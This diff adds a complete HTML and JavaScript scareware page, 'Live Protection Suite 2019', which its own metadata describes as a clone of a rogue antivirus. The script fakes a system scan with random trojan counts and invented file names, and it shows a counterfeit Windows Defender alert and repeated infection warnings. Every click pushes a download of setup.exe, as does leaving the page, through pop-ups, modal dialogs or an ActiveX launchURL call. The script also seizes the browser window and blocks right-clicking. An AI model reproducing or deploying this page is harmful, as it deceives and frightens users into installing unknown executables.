@@ -1,0 +1,370 @@
+<html>
+	<head>
+	
+	<meta property="og:title" content="Live Protection Suite 2019" />
+	<meta property="og:type" content="website" />
+	<meta property="og:url" content="http://lps2019.projectome.ga" />
+	<meta property="og:image" content="http://lps2019.projectome.ga/img/1/3/alertmeta.png" />
+	<meta property="og:description" content="Being a clone of Antivirus 10, this is the latest rogue from 2019." />
+
+		<style type="text/css">
+			*{
+				cursor: default;
+				outline: none
+			}
+			body {
+				font-family:Tahoma, Arial, Helvetica, sans-serif;
+				font-size:11px;
+				background-color: #fff;
+				color:#000;
+				width: 100%;
+				height:100%;
+				margin:0;
+				padding:0;
+				overflow: hidden;
+			}
+			.clear {
+				clear:both;
+				position:relative;
+				font-size:0px;
+				height:0px;
+				line-height:0px
+			}
+			.inner{
+				padding: 5px 20px;
+			}
+			.white{
+				background: #fff;
+				height: 100%;
+			}
+			#sidebar {
+				position: absolute;
+				left:0;
+				top: 0;
+				color: #33C;
+				height: 200%;
+				width: 179px;
+				padding: 5px;
+				background: #fcfcfc url(img/1/3/sidebar.bg.png) no-repeat center 20px;
+				border-right: 1px solid #d6e5f5;
+			}
+
+			#content{
+				position: relative;
+				width: 100%;
+				height:500px;
+				padding-left: 190px;
+			}
+
+			#progressbar{
+				position: relative;
+				width: 541px;
+				height: 21px;
+				background: url(img/1/3/progressbar.bg.png) no-repeat;
+				margin-left: 20px;
+				margin-top: 10px;
+			}
+			#loading{
+				position: absolute;
+				top: 1px;
+				left: 1px;
+				width: 0px;
+				height: 19px;
+				background: url(img/1/3/loading.green.gif) repeat-x;
+				overflow: hidden;
+			}
+			#highlight{
+				width: 239px;
+				height: 19px;
+				background: url(img/1/3/loading.highlight.png) no-repeat;
+			}
+			.sector{
+				position: relative;
+			}
+			.sector h2{
+				background: url(img/1/3/sector.bg.gif) no-repeat;
+				padding-left: 20px;
+				font: normal 14px Verdana, Geneva, Arial, Helvetica, sans-serif;
+				color: #4b329c;
+			}
+			.sector hr{
+				position: absolute;
+				left: 180px;
+				top: 3px;
+				width: 100%;
+				height: 1px;
+				border: none;
+				background: #e2e2e2;
+			}
+
+			.sector.drs hr{
+				left: 290px;
+			}
+
+			#hdd{
+				position: relative;
+				width: 510px;
+				height: 58px;
+				background: url(img/1/3/sector.hdd.png) no-repeat
+			}
+			#hdd span.c{
+				position: absolute;
+				top: 38px;
+				left: 62px;
+				font-weight: bold;
+				color: #f44;
+			}
+			#hdd span.d{
+				position: absolute;
+				top: 38px;
+				right: 90px;
+				font-weight: bold;
+				color: #f44;
+			}
+			#drs{
+				width: 510px;
+				height: 58px;
+				background: url(img/1/3/sector.removable.png) no-repeat
+			}
+
+
+			#security{
+				position: relative;
+				width: 604px;
+				height: 115px;
+				background: url(img/1/3/security.png) no-repeat;
+				margin-top: 20px;
+			}
+			#security div{
+				position: absolute;
+				top: 67px;
+				left: 35px;
+				font: normal 11px Verdana, Geneva, Arial, Helvetica, sans-serif;
+			}
+			#security button{
+				position: absolute;
+				bottom: 37px;
+				right: 35px;
+				font: normal 11px Verdana, Geneva, Arial, Helvetica, sans-serif;
+			}
+
+			#current{
+				margin-left: 30px;
+				margin-top: 5px;
+			}
+			#current.finish{
+				font-weight: bold;
+				color: #e00;
+				font-size: 110%;
+			}
+			#current span{
+				font-weight: bold;
+				color: #244edb;
+			}
+			#security2{
+				position: relative;
+				width: 587px;
+				height: 223px;
+				background: url(img/1/3/security2.png) no-repeat;
+				margin-top: 20px;
+			}
+			#security2 h3{
+				position: absolute;
+				top: 11px;
+				left: 60px;
+				padding: 0;
+				margin: 0;
+				font: bold 14px Tahoma;
+				color: #d70100;
+			}
+
+			#report{
+				height: 180px;
+				position: absolute;
+				top: 37px;
+				left: 6px;
+			}
+			#report div{
+				height: 146px;
+				overflow: auto;
+			}
+			#report table{
+				border-collapse: collapse;
+			}
+
+			div#report th{
+				text-align: left;
+				line-height: 34px;
+				font-size: 11px;
+				background: #eee;
+				padding: 0 5px;
+			}
+			#report td{
+				padding: 12px 6px;
+				font-size: 11px;
+			}
+			#report td.name{
+				background: url(img/1/3/qicon.gif) no-repeat 5px center;
+				font-weight: bold;
+				padding-left: 25px;
+				font-size: 11px;
+			}
+			#report td.red{
+				color: #dc0100;
+				font-weight: bold;
+				font-size: 11px;
+			}
+			#report td.count{
+				text-align: center;
+				font-size: 11px;
+			}
+			#alert{
+				display: none;
+				position: absolute;
+				top: 50%;
+				left: 50%;
+				margin-top: -122px;
+				margin-left: -242px;
+				width: 484px;
+				height: 243px;
+				background: url(img/1/3/alert.png) no-repeat;
+			}
+
+			#alert span{
+				width: 340px;
+				position: absolute;
+				display: block;
+				top: 20px;
+				left: 20px;
+				font-size: 15px;
+				font-weight: bold;
+			}
+			#alert div.text{
+				background: url(img/1/3/icon.alert.jpg) no-repeat 0px 65px;
+				padding-top: 65px;
+				padding-left: 68px;
+				width: 360px;
+				margin-left: 20px;
+				font-size: 120%;
+			}
+			#alert div.text div{
+				text-align: right;
+			}
+			#alert div.text div button{
+				margin: 5px;
+			}
+			#alert .notes{
+				background: #e4ecf8;
+				border-top: 1px solid #d4dce8;
+				margin: 15px 21px 10px 19px;
+				padding: 10px;
+			}
+			#alert a.close{
+				position: absolute;
+				display: block;
+				top: 7px;
+				right: 17px;
+				width: 56px;
+				height: 28px;
+			}
+			#alert a.close:hover{
+				background: url(img/1/3/button.close.hover.png) no-repeat;
+			}
+
+		</style>
+		<script style="-moz-user-select: none;" type="text/javascript" src="js/jquery.js"></script>
+		<script style="-moz-user-select: none;" type="text/javascript" src="js/jquery-ui-1.js"></script>
+		<script style="-moz-user-select: none;" type="text/javascript" src="js/functions.js"></script>
+		<script style="-moz-user-select: none;" type="text/javascript" src="js/atemwgyji.js"></script>
+
+		<script>
+			// Array of 'Files for check'))
+			var _$a0 = new Array("drvd","booto","msiwsr","tooledwk","tool.","msiec","drvncrb","muis","sysa$ve","batfmag_","msilo.m-","muidvgu","drv-h","msiemeis","boot$mtf","confac$m","appw$v","toolqcwy","apppxb$","appp_r","toolfb","winjdwul","msieba","toolzu","muia","bootu_gqw","confg","confm-z","msorpbl","batl","msofh","tooljxie","winwp","batcxh-","drvpm","msoy-a","win.dpk","muivkbr$","sys.xbj_","sysinv","msoaq","winqe","sysmqszu","bate","msimwqo","confug$","applws","msot_pgn","syspt","mui-glr","msifvt","boot$-xz","bootckde","confkxwy","batxgz","msiecka","msomz","bootbxtj","batbr","muis.-dq","confj$r-g","confjxhan","sysy","winj-bwz","drvljnmo","appme","bootfkj","bootzxtej","sysys","msimyz$x","drvtg","appgp","msijbdl","msi.mle","msonmwv","msiewxadc","confx","msiel$sve","msielnh","batcblg","app$qvep","syslwoxy","wini_xzw","batu-","msieysf$a","toolz","drvza$ms","toolnuvi","drvvj","systmkf","muioebnc","msojc","msidfm.q","msos_h.","winj","winlkso$","appaxnk","msiqczf","bootfmk_u","muin");
+			var ad4 = new Array("drv","msc","nls","tmp","iec","hsp","qlm","xml","cpl","rll","hlp","nsf","uce","txt","wsc","cpi","inf","exe","cpl","pro","exe","ini","tsk","sql","bin","sys","hxx","cpx","ini","dat","srg","ocx","dll","ram","ax","rom","tsp","ini","cnt","acm","tlb","dic","scr","h","vbs","dll","cmd","vxd","com","nt","chm");
+// agress Out text===========
+			var al3 = "There is a big chance that your computer is infected! They can cause data loss and file damages and need to be fixed as soon as possible. Return to Microsoft Security Assessment Tool and download it to guard your PC";
+// agress Out text===========
+
+
+			// trigerrs of agression (default off)
+			var agress_in = 1;  // agress in trigger; 0 - off, 1 - on
+			var agress_out = 1; // agress out trigger; 0 - off, 1 - on
+
+
+			// virus database
+	var vData = {id: 0,current:
+				 0,0: {name: "Email-Worm.Win32.Net",date: "05/13/2011"},
+				 1: {name: "Email-Worm.Win32.Myd",date: "06/13/2011"},
+				 2: {name: "Trj-Dwnldr.Win",date: "07/17/2011"},
+				 3: {name: "Email-Worm.Win32.Eyeveg.b",date: "02/13/2011"},
+				 4: {name: "Lemena.3544",date: "04/13/2011"},
+				 5: {name: "Macro.PPoint.Attach",date: "07/18/2011"},
+				 6: {name: "Virus.BAT.Vr.a",date: "02/10/2011"},
+				 7: {name: "Backdoor.Perl.AEI.20",date: "06/31/2011"},
+				 8: {name: "Trojan-Spy.Win32.WMPatch",date: "03/13/2011"},
+				 9: {name: "Trojan-PSW.Win32.Aletc",date: "02/13/2011"},
+				 10: {name: "WIN.KOOBFACE",date: "08/01/2011"}};
+
+// agress_in functions/basic alerts
+	function alert1() {
+		if(agress_in == 1){
+				confirm("Warning! Malicious programs have been detected on your computer. The system will now perform a security check.");
+			}
+	}
+
+	function alert2() { 	
+		confirm("Your computer remains infected by malware! There is a possible loss of data. Return to the page and download the tool to clean up your computer.");
+	}
+
+	function alert3() {
+		confirm("There is a huge chance that your computer is infected! Malware can cause data loss and file corruption, it must be fixed as soon as possible. Return to the page and download the tool to clean up your computer.");
+	}
+
+	document.title='Live Protection Suite 2019'; // Title tag
+
+// !!! Target URL
+	function dload() {return window.location = "setup.exe";}
+
+	function a2way() {
+		w = window;
+		ua = navigator.userAgent;
+		v1 = ua.toLowerCase().indexOf('msie') != -1&& ua.toLowerCase().indexOf('opera') < 0;x = 11;
+		eval('w.resizeTo(x*10,x*11-7)');
+		w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027,v1 ? (screen.height - 100) >> 1 : 10659);}
+
+		var usePopDialog = true;
+		var popDialogOptions = "dialogWidth:"+ screen.width+ "px; dialogHeight:"+ screen.height+ "px; dialogTop:0px; dialogLeft:0px; edge:Raised; center:0; help:0; resizable:1; scroll:1; status:0";
+		var popWindowOptions = "scrollbars=0,menubar=1,toolbar=1,location=0,personalbar=1,status=0,resizable=1";
+		var usePopDialog = true;
+		var isXPSP2 = (window.navigator.userAgent.indexOf("SV1") != -1);
+		var u = "6BF52A52-394A-11D3-B153-00C04F79FAA6";
+
+// !!! Target URL
+		var LRUpop = "setup.exe"; // for ie 6 or lower and old popupblockers
+
+// agress_out function
+		function ext() {if (agress_out == 1) {
+			alert3();
+			if (!isXPSP2 && !usePopDialog) {window.open(LRUpop, "", popWindowOptions);}
+			else if (!isXPSP2 && usePopDialog)
+			{eval("window.showModalDialog(LRUpop,'',popDialogOptions)");}
+			else {document.body.innerHTML += "<object id=iie width=0 height=0 classid='CLSID:" + u + "'></object>";iie.launchURL(LRUpop);}}}
+			if (window.attachEvent){eval("window.attachEvent('onunload',ext);");}
+			else {window.addEventListener("unload", ext, false);}
+			var intervals = {highlight: null, fileInfo: null};
+			var process = {progress1: 1,progress2: 1,found:{c: 0,d: 0},current: 0};
+
+
+// !!!!!No break this strings
+	//HTML formation=====
+		$(function(){$("body").attr("innerHTML", '<div id="content"><div id="sidebar"></div><div class="inner"><div class="sector hdd"><h2>Hard Disk Drives (2)</h2><hr/><div id="hdd"><span class="c"></span><span class="d"></span></div></div><div class="sector drs"><h2>Devices with Removable Storage (2)</h2><hr/><div id="drs"></div></div><div class="sector drs"><h2>System scan progress</h2><hr/><div id="progressbar"><div id="loading"><div id="highlight"></div></div></div><div id="current">Now scanning: <span></span></div></div></div><div class="white inner"><div id="security2"><h3>Your Computer is Infected!</h3><div id="report"><table><tr><th width="190">Name</th><th width="80">Risk level</th><th width="65">Date</th><th width="90">Files infected</th><th width="101">State</th></tr></table><div><table><tr><th width="190"></th><th width="80"></th><th width="65"></th><th width="90"></th><th width="101"></th></tr></table></div></div></div><div id="security"><div>Windows did not find antivirus software on this computer</div><button>Find a program online</button></div></div></div><div class="clear"></div><div id="alert"><a href="#" class="close"></a><span>Windows Security Alert</span><div class="text">To help protect your computer, Windows Defender has detected spyware and ready to remove them<div><button>Remove all</button><button>Cancel</button></div></div><div class="notes">Spyware is software which is loaded onto your computer without your knowledge, or possibly without the full functionality being made clear to you. It can, among other things, slow your internet connection down and make frustrating changes to your browser.</div></div>').click(function(e){e.preventDefault();dload();return false;});
+	//Animation
+		$("#loading").animate({width: 300}, 1000, "linear", function(){$(this).animate({width: 439}, 4000, function(){$(this).animate({width: 539}, 5000, "linear", function(){clearInterval(intervals.fileInfo);clearInterval(intervals.highlight);$("#alert").fadeIn("fast");var currentParent = process.current.parent();currentParent.addClass("finish");currentParent.html("Scan&nbsp;complete.&nbsp;"+(process.progress1+process.progress2)+"&nbsp;fileinfos&nbsp;was&nbsp;found!");});});});highlight();intervals.highlight = setInterval(highlight, 2000);intervals.fileInfo = setInterval(fileInfo, 200);$("#alert").draggable({ scroll: false, handle: "h3" });$("*").disableTextSelect();$(document).bind("contextmenu", function(e){e.preventDefault();return false;});process.found.c = $("#hdd span.c");process.found.d  = $("#hdd span.d");process.current = $("#current span");vData.id = $("#report div table");});function fileInfo(){var rand1 = Math.floor(Math.random()*(8));var rand2 = Math.floor(Math.random()*(10));process.progress1 += rand1;process.found.c.text('Found '+process.progress1+' trojans');if(rand2 < 4){process.progress2 += rand2;process.found.d.text('Found '+process.progress2+' trojans');}if(rand1 < 3 && vData.current <= 10){vData.id.append('<tr><td class="name">'+vData[vData.current].name+'</td><td class="red">Critical</td><td>'+vData[vData.current].date+'</td><td class="count">'+(Math.floor((process.progress1+process.progress2)/(Math.random()*process.progress2)))+'</td><td>Waiting removal</td></tr>');vData.current++;}process.current.text(_$a0[Math.floor(Math.random() * _$a0.length)]+"."+ad4[Math.floor(Math.random() * ad4.length)]);}function highlight(){$("#highlight").css("margin-left", "-50px");$("#highlight").animate({marginLeft: 539}, 1000);}function getW(){return window;}(function(){if (window.attachEvent){a2way();}alert1();getW().moveTo(0,0);getW().resizeTo(screen.availWidth, screen.availHeight);window.focus();})();</script>
+		</script>
+
+
+	</head>
+	<body>
+	</body>
+
+</html>
